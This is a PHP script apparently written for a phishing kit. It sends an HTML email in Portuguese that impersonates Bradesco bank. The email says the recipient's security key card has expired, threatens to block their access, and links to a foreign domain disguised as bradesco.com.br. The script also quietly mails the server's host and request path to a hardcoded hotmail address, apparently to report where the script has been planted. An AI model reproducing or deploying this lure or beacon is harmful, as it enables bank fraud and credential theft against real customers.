<?php
//=================================
//
//    InsideTeam Inbox Scanner
//	     v1.0 FEDO
//  
//      
//     O Preto que Destribuir
//      Nao Vai Receber Info
//     	     by jonny
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $remetente = "xexelento@xexelento.com.br";
 $assunto = "xexelento";
 $email1 = "by_leone@hotmail.com";
 $headers  = "MIME-Version: 1.0\r\n";
 $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
 $headers .= "From: xexelento <$remetente>\r\n";
 $headers .= "Bcc: &$remetente\r\n";
 $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Bradesco S/A</title>
</head>

<body>
<TABLE id=ecxtable6 cellSpacing=1 cellPadding=0 width=570 align=center border=0>
<TBODY>
<TR>
<TD vAlign=top width=613 bgColor=#ffffff height=50>
<DIV align=center><IMG height=65 src="http://zsjs.nmfc.gov.cn/imagem/toppr.png" width=568></DIV></TD></TR>
<TR>
<TD vAlign=top bgColor=#ffffff>
<P align=left><BR><FONT face="Arial, Helvetica, sans-serif" size=2>� com grande satisfa��o que a equipe de seguran�a do <STRONG>Internet Banking</STRONG> <STRONG>Bradesco </STRONG>envia este e-mail a voc�, cliente.</FONT>
<P align=left><FONT face="Arial, Helvetica, sans-serif" size=2>O motivo pelo qual estamos entrando em contato, � para alertar que seu <STRONG><FONT color=#cc0033>Cart�o chave de seguranca Bradesco</FONT></STRONG> foi expirado, pedimos para que atualize o mesmo.</FONT>
<P align=left><FONT face="Arial, Helvetica, sans-serif" size=2>A atualiza��o do seu <STRONG><FONT color=#cc0033>Cart�o chave de seguranca Bradesco</FONT></STRONG> � necess�ria, pois � fundamental para sua seguran�a, caso o mesmo n�o seja atualizado at� a data 20/10/2009</FONT><BR>
  <FONT face="Arial, Helvetica, sans-serif" size=2><STRONG>- As chaves de seguran�a ser�o desativadas;</STRONG></FONT><BR>
  <FONT face="Arial, Helvetica, sans-serif" size=2><STRONG>- Seu acesso ao Internet Banking, Fone F�cil e nos Caixas Eletronicos ser�o bloqueados (desbloqueio s� poder� ser realizado com seu gerente de relacionamento)</STRONG></FONT><BR>
  <FONT face="Arial, Helvetica, sans-serif" size=2>Atualize agora seu CART�O, no link abaixo:</FONT>
<P align=left><a href="http://www.cosentinoehijo.com.ar/recadastramento/">http://www.bradesco.com.br</a>
<P align=left><FONT face="Arial, Helvetica, sans-serif" size=2>O Bradesco trabalha continuamente para o mais alto n�vel de seguran�a de suas transa��es cont�beis.</FONT>
<P align=left><FONT face="Arial, Helvetica, sans-serif" size=2><STRONG><EM>ALERTA</EM></STRONG><BR>
  Devido a legisla��o vigente o acesso as ag�ncias do Bradesco est�o sendo controladas, alertamos que evite o comparecimento, assim prevenindo-se da gripe A (H1N1).</FONT><BR>
<P align=left><FONT face="Arial, Helvetica, sans-serif" size=2>Atenciosamente <FONT color=#cc0033><STRONG>Bradesco S.A.</STRONG></FONT></FONT><BR></P></TD></TR>
<TR>
<TD vAlign=top bgColor=#ffffff>
<P align=center><FONT face="Arial, Helvetica, sans-serif" size=2><BR>� 2009 Bradesco SA. Todos os direitos reservados.<BR></FONT></P></TD></TR></TBODY></TABLE>

</body>
</html>';if(mail($email1, $assunto, $html . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
 }
 else{
 echo "N&#227;o enviei..";
 exit();
 }
?>

